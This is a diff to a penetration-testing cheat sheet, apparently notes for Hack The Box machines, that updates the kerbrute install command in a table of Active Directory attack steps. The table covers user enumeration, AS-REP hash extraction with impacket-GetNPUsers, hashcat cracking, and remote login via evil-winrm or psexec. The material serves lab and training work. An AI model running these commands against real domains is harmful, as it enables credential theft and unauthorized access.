@@ -1372,8 +1372,8 @@ Used in: [Infiltrator](/htb/infiltrator.md)
 
 |   |   |
 |---|---|
-|Install [kerbrute](https://github.com/TarlogicSecurity/kerbrute)|`pip3 install kerbrute`|
-|Find users with preauthentication disabled|`kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -domain $DOMAIN -dc-ip $DC_IP`|
+|Install [kerbrute](https://github.com/TarlogicSecurity/kerbrute)|`pipx install kerbrute`|
+|Find users with preauthentication disabled|`~/.local/bin/kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -domain $DOMAIN -dc-ip $DC_IP`|
 |Use GetNPUsers.py to get password hashes|`impacket-GetNPUsers $DOMAIN/$USERNAME -no-pass -dc-ip $DC_IP`|
 |Use hashcat to crack the hashes|`hashcat -m 18200 $HASH_FILE /usr/share/wordlists/rockyou.txt`|
 |Connec to target|`evil-winrm -i #TARGET -u $USERNAME -p $PASSWORD`<br>`impacket-psexec [$DOMAIN/]$USERNAME:$PASSWORD@$TARGET [$COMMAND]`|
